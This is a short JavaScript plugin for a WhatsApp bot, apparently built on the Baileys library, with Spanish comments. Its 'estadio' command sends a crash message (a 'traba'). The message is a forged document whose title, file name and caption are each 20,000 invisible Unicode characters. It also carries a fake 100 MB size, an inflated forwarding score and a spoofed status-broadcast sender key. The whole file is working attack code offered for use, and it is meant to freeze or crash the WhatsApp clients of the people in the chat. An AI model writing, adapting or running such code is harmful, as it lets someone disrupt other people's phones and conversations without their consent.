let handler = async (m, { conn }) => {
  try {
    const invisible = '\u200F'.repeat(20000) // Puedes subir a 50000 si quieres probar más fuerte
    const jpegFake = Buffer.from('') // Miniatura vacía (puedes agregar base64 si quieres miniatura real)

    const fakeKey = {
      remoteJid: 'status@broadcast',
      fromMe: false,
      id: m.id,
      participant: '0@s.whatsapp.net',
    }

    const fakeDoc = {
      documentMessage: {
        title: invisible,
        fileName: invisible,
        caption: invisible,
        mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        fileLength: 100000000,
        pageCount: 1,
        mediaKey: '',
        fileSha256: '',
        fileEncSha256: '',
        directPath: '',
        mediaKeyTimestamp: 1,
        jpegThumbnail: jpegFake,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title: invisible,
            body: ' ',
            thumbnail: jpegFake,
            mediaType: 1,
            renderLargerThumbnail: false,
            showAdAttribution: false
          }
        }
      }
    }

    await conn.relayMessage(m.chat, fakeDoc, { messageId: m.key.id, messageKey: fakeKey })
    await conn.sendMessage(m.chat, { text: '✅ Traba combinada enviada. Comprueba si se ve en el chat.' }, { quoted: m })

  } catch (e) {
    console.error(e)
    await conn.sendMessage(m.chat, { text: '❌ Falló el envío de la traba combinada.' }, { quoted: m })
  }
}

handler.command = ['estadio']
handler.help = ['estadio']
handler.tags = ['traba', 'bug']
handler.premium = false

export default handler